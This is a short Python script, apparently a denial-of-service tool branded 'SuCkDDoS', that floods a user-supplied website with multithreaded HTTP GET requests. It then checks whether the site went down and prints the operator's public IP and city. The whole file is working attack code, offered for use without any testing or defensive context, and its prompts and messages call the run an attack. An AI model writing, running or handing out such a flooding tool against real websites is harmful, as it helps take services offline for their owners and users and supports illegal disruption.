import threading
import requests
import time
import socket
from datetime import datetime

def send_requests(url, num_requests, delay):
    """Sends HTTP GET requests to the specified URL."""
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            print(f"Request sent to {url} - Status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")
        time.sleep(delay)

def check_website_status(url):
    """Checks if the website is down."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Website {url} is up and running.")
        else:
            print(f"Website {url} is not reachable. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Failed to reach {url}: {e}")

def get_ip_and_city():
    """Fetches the public IP address and city."""
    try:
        ip_info = requests.get("https://ipinfo.io/json").json()
        ip = ip_info.get("ip", "Unknown")
        city = ip_info.get("city", "Unknown")
        return ip, city
    except requests.RequestException:
        return "Unknown", "Unknown"

def display_ascii_art():
    """Displays the ASCII art for the tool."""
    ascii_art = """
   
   _____       ________   ____      ______      
  / ___/__  __/ ____/ /__/ __ \____/ / __ \_____
  \__ \/ / / / /   / //_/ / / / __  / / / / ___/
 ___/ / /_/ / /___/ ,< / /_/ / /_/ / /_/ (__  ) 
/____/\__,_/\____/_/|_/_____/\__,_/\____/____/  
                                                
                              
   """
    print(ascii_art)
    print("Code by Abu Talha")

def start_attack():
    """Initiates the attack based on user input."""
    url = input("Target website (e.g., http://example.com): ")
    num_threads = int(input("Number of threads to use: "))
    num_requests = int(input("Number of requests per thread: "))
    delay = float(input("Delay between requests (in seconds): "))
    
    ip, city = get_ip_and_city()
    
    print(f"Your IP: {ip}, City: {city}")
    print("Starting attack...")
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(url, num_requests, delay))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("Attack completed. Checking website status...")
    check_website_status(url)

if __name__ == "__main__":
    display_ascii_art()
    start_attack()

